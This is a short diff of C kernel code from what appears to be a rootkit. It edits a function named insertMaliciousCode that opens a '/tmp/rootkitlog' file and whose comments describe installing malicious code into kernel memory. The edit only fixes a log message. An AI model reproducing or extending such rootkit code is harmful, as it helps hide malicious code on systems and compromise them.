@@ -119,7 +119,7 @@ insertMaliciousCode (struct thread * td, int * fd) {
   //
   kern_open (td, "/tmp/rootkitlog", UIO_SYSSPACE, O_WRONLY | O_CREAT, 0777);
   *fd = td->td_retval[0];
-  printf ("Rootkit: Opened %s: %d\n", memp, fd);
+  printf ("Rootkit: Opened %s: %d\n", "/tmp/rootkitlog", fd);
 
   //
   // Install malicious code into the allocated memory.
